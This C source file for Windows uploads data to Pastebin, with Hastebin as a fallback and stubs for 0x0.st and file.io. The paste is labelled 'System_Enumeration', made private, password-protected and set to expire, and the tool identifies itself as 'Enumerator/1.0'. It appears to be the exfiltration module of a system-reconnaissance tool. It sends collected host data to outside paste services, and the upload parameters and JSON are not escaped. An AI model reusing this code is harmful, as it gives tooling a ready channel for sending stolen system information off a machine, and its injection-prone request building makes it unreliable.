#include "pastebin.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

// Default Pastebin API key (user should replace with their own)
#define DEFAULT_PASTEBIN_API_KEY "YOUR_API_KEY_HERE"

// Test Pastebin API availability
bool test_pastebin_api(void) {
    HINTERNET hInternet = InternetOpenA("Enumerator/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, "https://pastebin.com/api/api_post.php", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

// Upload to Pastebin
upload_result_t upload_to_pastebin(const char* data, size_t data_len, const char* password) {
    upload_result_t result = {0};
    result.service_used = PASTE_PASTEBIN;
    
    // Test API first
    if (!test_pastebin_api()) {
        result.success = false;
        strcpy(result.error_message, "Pastebin API test failed");
        return result;
    }
    
    HINTERNET hInternet = InternetOpenA("Enumerator/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        result.success = false;
        strcpy(result.error_message, "Failed to initialize WinInet");
        return result;
    }
    
    HINTERNET hConnect = InternetConnectA(hInternet, "pastebin.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        result.success = false;
        strcpy(result.error_message, "Failed to connect to Pastebin");
        return result;
    }
    
    // Build POST data
    char postData[10240];
    char encodedData[10240 * 3];  // URL encoding can triple size
    size_t encodedLen = 0;
    
    // Simple URL encoding
    for (size_t i = 0; i < data_len && i < 5000; i++) {
        char c = data[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            encodedData[encodedLen++] = c;
        } else if (c == ' ') {
            encodedData[encodedLen++] = '+';
        } else {
            sprintf(encodedData + encodedLen, "%%%02X", (unsigned char)c);
            encodedLen += 3;
        }
    }
    encodedData[encodedLen] = '\0';
    
    // Build POST parameters
    snprintf(postData, sizeof(postData),
        "api_dev_key=%s&api_option=paste&api_paste_code=%.*s&api_paste_name=System_Enumeration&api_paste_format=text&api_paste_private=1&api_paste_expire_date=1W&api_paste_password=%s",
        DEFAULT_PASTEBIN_API_KEY, (int)(encodedLen < 5000 ? encodedLen : 5000), encodedData, password);
    
    const char* headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/api_post.php", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        result.success = false;
        strcpy(result.error_message, "Failed to create HTTP request");
        return result;
    }
    
    if (!HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), postData, (DWORD)strlen(postData))) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        result.success = false;
        DWORD error = GetLastError();
        sprintf(result.error_message, "HTTP request failed: %lu", error);
        return result;
    }
    
    // Read response
    char response[512];
    DWORD bytesRead = 0;
    if (InternetReadFile(hRequest, response, sizeof(response) - 1, &bytesRead)) {
        response[bytesRead] = '\0';
        
        // Check if response is a URL (starts with http)
        if (strncmp(response, "http", 4) == 0) {
            strncpy(result.url, response, sizeof(result.url) - 1);
            result.url[sizeof(result.url) - 1] = '\0';
            result.success = true;
        } else {
            // Error response
            strncpy(result.error_message, response, sizeof(result.error_message) - 1);
            result.success = false;
        }
    } else {
        result.success = false;
        strcpy(result.error_message, "Failed to read response");
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result;
}

// Upload to Hastebin (fallback)
upload_result_t upload_to_hastebin(const char* data, size_t data_len) {
    upload_result_t result = {0};
    result.service_used = PASTE_HASTEBIN;
    
    HINTERNET hInternet = InternetOpenA("Enumerator/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        result.success = false;
        strcpy(result.error_message, "Failed to initialize WinInet");
        return result;
    }
    
    HINTERNET hConnect = InternetConnectA(hInternet, "hastebin.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        result.success = false;
        strcpy(result.error_message, "Failed to connect to Hastebin");
        return result;
    }
    
    // Build JSON payload
    char jsonPayload[10240];
    snprintf(jsonPayload, sizeof(jsonPayload), "{\"content\":\"%.*s\"}", (int)(data_len < 5000 ? data_len : 5000), data);
    
    const char* headers = "Content-Type: application/json\r\n";
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/documents", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        result.success = false;
        strcpy(result.error_message, "Failed to create HTTP request");
        return result;
    }
    
    if (!HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), jsonPayload, (DWORD)strlen(jsonPayload))) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        result.success = false;
        strcpy(result.error_message, "HTTP request failed");
        return result;
    }
    
    // Read response
    char response[512];
    DWORD bytesRead = 0;
    if (InternetReadFile(hRequest, response, sizeof(response) - 1, &bytesRead)) {
        response[bytesRead] = '\0';
        // Parse JSON response for key
        char* keyStart = strstr(response, "\"key\":\"");
        if (keyStart) {
            keyStart += 7;
            char* keyEnd = strchr(keyStart, '"');
            if (keyEnd) {
                *keyEnd = '\0';
                snprintf(result.url, sizeof(result.url), "https://hastebin.com/%s", keyStart);
                result.success = true;
            }
        }
    }
    
    if (!result.success) {
        strcpy(result.error_message, "Failed to parse Hastebin response");
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result;
}

// Upload to 0x0.st (fallback)
upload_result_t upload_to_0x0st(const char* data, size_t data_len) {
    upload_result_t result = {0};
    result.service_used = PASTE_0X0ST;
    result.success = false;
    strcpy(result.error_message, "0x0.st upload not implemented");
    return result;
}

// Upload to File.io (fallback)
upload_result_t upload_to_fileio(const char* data, size_t data_len) {
    upload_result_t result = {0};
    result.service_used = PASTE_FILEIO;
    result.success = false;
    strcpy(result.error_message, "File.io upload not implemented");
    return result;
}
